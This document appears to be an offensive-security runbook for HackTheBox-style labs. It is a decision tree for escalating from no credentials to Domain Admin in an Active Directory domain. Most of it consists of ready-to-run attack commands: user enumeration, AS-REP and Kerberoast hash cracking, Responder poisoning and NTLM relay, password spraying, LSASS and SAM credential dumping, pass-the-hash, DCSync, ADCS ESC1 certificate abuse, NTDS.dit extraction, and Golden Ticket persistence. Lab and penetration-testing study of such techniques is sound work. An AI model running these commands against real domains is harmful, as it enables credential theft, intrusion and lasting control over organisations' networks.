# Runbook: Active Directory Decision Tree → Domain Admin

**Use when:** The target is an AD/Windows domain (ports 88, 389, 445, 464, 3268, 5985; NTLM in HTTP; Windows banners) and you need a deterministic route from *whatever you currently hold* to Domain Admin.
**Produces:** A single next decision at every state — no wandering.
**Prerequisites:** HTB VPN reach, `netexec`/`nxc`, `impacket`, `certipy-ad`, `bloodhound-python`, `evil-winrm`, `kerbrute`. `responder` may not be installed by default — see `knowledge-base/checklists/ad-coercion-and-relay.md` (flagged there).

This file is a **router**, not a tutorial. Each branch ends in an exact command and *one* next decision, then hands off to the deep playbooks. Do the deep reading in the referenced file, not here.

---

## Variables (set once)

```bash
export TARGET="10.X.X.X"          # ← DC IP
export DC="dc.domain.tld"         # ← DC FQDN
export DOMAIN="domain.tld"        # ← FQDN
export NETBIOS="DOMAIN"           # ← short name
export IFACE="tun0"               # ← HTB VPN interface
export REPORTS="$HOME/.openclaw/workspace/reports/$TARGET"
mkdir -p "$REPORTS"/{enum,creds,bloodhound,loot}
# Kerberos needs name resolution + clock sync:
echo "$TARGET $DC $DOMAIN" | sudo tee -a /etc/hosts >/dev/null
sudo ntpdate "$TARGET" 2>/dev/null || sudo rdate -n "$TARGET"
```

---

## STATE 0 — Which state am I in? (start here)

Answer the first "yes" and jump:

- I have **no credentials at all** → **STATE A**
- I have **valid low-priv domain creds** (user:pass, NT hash, or TGT) → **STATE B**
- I have **local admin / SYSTEM on a domain host** (not the DC) → **STATE C**
- I have **a path to DA confirmed** (DCSync rights, DA creds, or DC admin) → **STATE D**

Re-run STATE 0 after every credential gain. New creds usually mean you moved A→B or B→C.

---

## STATE A — No credentials (unauthenticated)

Goal: obtain any username list, then any credential.

### A1. Domain identity + anonymous access
```bash
nxc smb "$TARGET"                                     # domain, hostname, OS, signing
nxc smb "$TARGET" -u '' -p '' --shares               # anon SMB
nxc smb "$TARGET" -u 'guest' -p '' --shares          # guest fallback
ldapsearch -x -H ldap://"$TARGET" -s base namingcontexts
ldapsearch -x -H ldap://"$TARGET" -b "DC=domain,DC=tld" '(objectClass=user)' sAMAccountName  # anon LDAP
```
**Decision:** Anonymous share/LDAP readable → mine it for creds/usernames, then go **STATE B** if creds found. Otherwise A2.

### A2. RID cycling (build a user list without creds)
```bash
nxc smb "$TARGET" -u 'guest' -p '' --rid-brute 10000 | tee "$REPORTS/enum/rid.txt"
# extract SamAccountName column → users.txt
```
No anon/guest? → A3.

### A3. Kerberos user enumeration (no creds needed)
```bash
kerbrute userenum -d "$DOMAIN" --dc "$TARGET" \
  /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 50 \
  | tee "$REPORTS/enum/kerbrute.txt"
```
**Decision:** Got a `users.txt` → A4. Still nothing → A5 (poisoning/coercion).

### A4. AS-REP roasting (no creds needed)
```bash
impacket-GetNPUsers "$DOMAIN"/ -dc-ip "$TARGET" -usersfile "$REPORTS/enum/users.txt" \
  -no-pass -format hashcat | tee "$REPORTS/creds/asrep.txt"
hashcat -m 18200 "$REPORTS/creds/asrep.txt" /usr/share/wordlists/rockyou.txt
```
Cracked → **STATE B**. Nothing roastable → A5.

### A5. Poisoning + coercion + relay (no creds)
Full commands and relay-target matrix in `knowledge-base/checklists/ad-coercion-and-relay.md`.
```bash
sudo responder -I "$IFACE" -dwv                       # LLMNR/NBT-NS/mDNS → NTLMv2
hashcat -m 5600 responder_hashes.txt /usr/share/wordlists/rockyou.txt
```
Coerce DC auth (PetitPotam/PrinterBug/Coercer) and relay to LDAP(S) for RBCD/shadow-creds, SMB for secretsdump, or ADCS HTTP for ESC8:
```bash
impacket-ntlmrelayx -t ldaps://"$DC" -smb2support --delegate-access   # RBCD via relay
# then coerce: see ad-coercion-and-relay.md (PetitPotam.py / printerbug.py / coercer)
```
**Decision:** Relay lands RBCD/shadow-creds/machine account → **STATE B or D**. Cracked spray password → **STATE B**.

**Password spraying** (only with a real user list; mind lockout — 3-5 passwords max per pass):
```bash
nxc smb "$TARGET" -u "$REPORTS/enum/users.txt" -p 'Welcome1' 'Password123!' --continue-on-success
```

---

## STATE B — Valid low-priv creds

Set your handle once:
```bash
export U="user"; export P="password"      # or: export H="LMHASH:NTHASH" and swap -p "$P" → -H "$H"
```

### B1. Validate + surface reach (always first)
```bash
nxc smb "$TARGET" -u "$U" -p "$P"                     # valid?  Pwn3d! = local admin → STATE C
nxc winrm "$TARGET" -u "$U" -p "$P"                   # WinRM?  → evil-winrm foothold
nxc smb "$TARGET" -u "$U" -p "$P" --shares --users --groups --pass-pol
```

### B2. BloodHound — mandatory before deep exploitation
```bash
bloodhound-python -u "$U" -p "$P" -d "$DOMAIN" -dc "$DC" -ns "$TARGET" -c All --zip
# Load → mark owned → Shortest Path to Domain Admin.
```
Interpret edges with `knowledge-base/checklists/bloodhound-edge-to-action.md`.
**Decision:** BloodHound shows a short high-value edge → jump to the matching sub-branch below. No graph yet or no short path → run B3/B4 in parallel.

### B3. Kerberoasting (cheap, do it early)
```bash
impacket-GetUserSPNs "$DOMAIN"/"$U":"$P" -dc-ip "$TARGET" -request -outputfile "$REPORTS/creds/kerb.txt"
hashcat -m 13100 "$REPORTS/creds/kerb.txt" /usr/share/wordlists/rockyou.txt
```
Cracked service account → re-enter **STATE B** as that account (often more reach).

### B4. ADCS scan (cheap, do it early — high win rate on Hard boxes)
```bash
certipy-ad find -u "$U"@"$DOMAIN" -p "$P" -dc-ip "$TARGET" -vulnerable -stdout
```
Any ESCx reported → **go to** `knowledge-base/mitre-attack/techniques/adcs-esc-deep.md` and exploit the exact ESC. ESC1/ESC8 typically route straight to DA.

### B5. Route by BloodHound edge (each → one abuse primitive)

| You control (edge) | Do this | Deep ref |
|---|---|---|
| `ForceChangePassword` on user | reset pw, re-auth as them → STATE B | `bloodhound-edge-to-action.md` |
| `GenericAll`/`AddSelf` on group | add self, re-auth → STATE B/C/D | `ad-abuse-commands.md` |
| `GenericAll`/`GenericWrite`/`WriteDacl` on **computer** | RBCD | `playbooks/ad-rbcd-privesc.md` |
| `WriteDacl`/`WriteOwner` on object | grant self FullControl first, then abuse | `ad-abuse-commands.md` (dacledit) |
| `AddKeyCredentialLink` on user/computer | shadow credentials | `playbooks/adcs-and-shadow-creds.md` |
| `GenericWrite` on user | add SPN → Kerberoast, or shadow creds | `bloodhound-edge-to-action.md` |
| Unconstrained delegation host | coerce DC → capture TGT | `ad-coercion-and-relay.md` |
| Constrained delegation (S4U) | `getST -impersonate Administrator` | `ad-abuse-commands.md` |
| GPO edit rights / `WriteGPLink` | push immediate scheduled task via pyGPOAbuse | `playbooks/ad-foothold-to-domain-admin.md` |
| DCSync rights (`GetChanges*`) | dump — **STATE D** | below |

Concrete ACL abuse templates (password reset, dacledit, RBCD, shadow, getST) live in `knowledge-base/tools/ad-abuse-commands.md`. Prioritization logic (which edge first) lives in `playbooks/ad-foothold-to-domain-admin.md`.

### B6. Credential hunting (parallel, cheap)
```bash
nxc smb "$TARGET" -u "$U" -p "$P" -M spider_plus       # readable shares
nxc smb "$TARGET" -u "$U" -p "$P" -M gpp_password      # SYSVOL cPassword
nxc ldap "$TARGET" -u "$U" -p "$P" -M laps             # LAPS ms-mcs-AdmPwd
```
Any new cred → re-run **STATE 0**.

**Exit STATE B when:** you get local admin on a host (→ C), or DCSync/DA (→ D).

---

## STATE C — Local admin / SYSTEM on a domain host (not DC)

Goal: harvest secrets and pivot until one of them is DA or DCSync-capable.

### C1. Dump host secrets
```bash
impacket-secretsdump "$NETBIOS"/"$U":"$P"@HOST         # SAM + LSA + cached
nxc smb HOST -u "$U" -p "$P" --lsa --sam               # LSA secrets, SAM
nxc smb HOST -u "$U" -p "$P" -M lsassy                 # LSASS creds
nxc smb HOST -u "$U" -p "$P" --dpapi                   # DPAPI-protected secrets
```

### C2. Token / ticket theft (if you have an interactive shell on the box)
```bash
# On host: Rubeus dump, or offline from LSASS. Then reuse:
export KRB5CCNAME=/path/stolen.ccache
impacket-wmiexec -k -no-pass "$DOMAIN"/user@HOST
```

### C3. Pass-the-Hash lateral sweep
```bash
nxc smb 10.X.X.0/24 -u administrator -H "$NTHASH" --continue-on-success   # find reuse
impacket-wmiexec -hashes :"$NTHASH" "$NETBIOS"/administrator@NEXTHOST
```
**Decision:** any dumped account has DCSync rights or is DA → **STATE D**. A dumped NT hash unlocks a new host → repeat STATE C there. Otherwise return to STATE B with the new creds.

---

## STATE D — Confirmed path to Domain Admin

Pick the one that matches how you got here.

### D1. DCSync (you hold `GetChanges`/`GetChangesAll` or DA)
```bash
impacket-secretsdump "$DOMAIN"/"$U":"$P"@"$DC" -just-dc          # all NTLM + Kerberos keys
impacket-secretsdump "$DOMAIN"/"$U":"$P"@"$DC" -just-dc-user krbtgt   # for Golden Ticket
```

### D2. ADCS ESC → DA (certipy)
Exploit the exact ESC from `knowledge-base/mitre-attack/techniques/adcs-esc-deep.md`, e.g. ESC1:
```bash
certipy-ad req -u "$U"@"$DOMAIN" -p "$P" -dc-ip "$TARGET" \
  -ca CA-NAME -template VULN-TEMPLATE -upn administrator@"$DOMAIN"
certipy-ad auth -pfx administrator.pfx -dc-ip "$TARGET"          # → NT hash / TGT of DA
```
Then DCSync with the recovered DA hash (D1).

### D3. NTDS.dit via SeBackupPrivilege (local admin on DC, no DCSync)
```bash
# On DC (evil-winrm), using SeBackupPrivilege:
reg save HKLM\SYSTEM C:\Temp\SYSTEM
robocopy /b C:\Windows\NTDS C:\Temp NTDS.dit          # /b uses backup privilege
# exfil both, then offline:
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

### D4. Verify + persist
```bash
export KRB5CCNAME=administrator.ccache                # from getST/ticketer/certipy
impacket-psexec -k -no-pass "$DOMAIN"/administrator@"$DC"
# Golden Ticket for persistence (need krbtgt hash + domain SID):
impacket-lookupsid "$DOMAIN"/"$U":"$P"@"$TARGET"      # get domain SID
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain "$DOMAIN" administrator
```

---

## End condition

You should have:
- ✅ DA-equivalent auth proven (`whoami /groups` shows Domain Admins, or DC C$ readable)
- ✅ `impacket-secretsdump ... -just-dc` dump saved to `$REPORTS/creds/`
- ✅ user.txt + root.txt / Administrator flag
- ✅ The exact edge chain recorded for the report

## Report

Use `templates/attack-report-template.md`. Record: starting state, every state transition (A→B→C→D), the exact BloodHound edge or ESC that unlocked DA, and all commands. Defensive framing (mitigations) for coercion/relay and ADCS is in the respective knowledge-base files — cite it for the thesis.
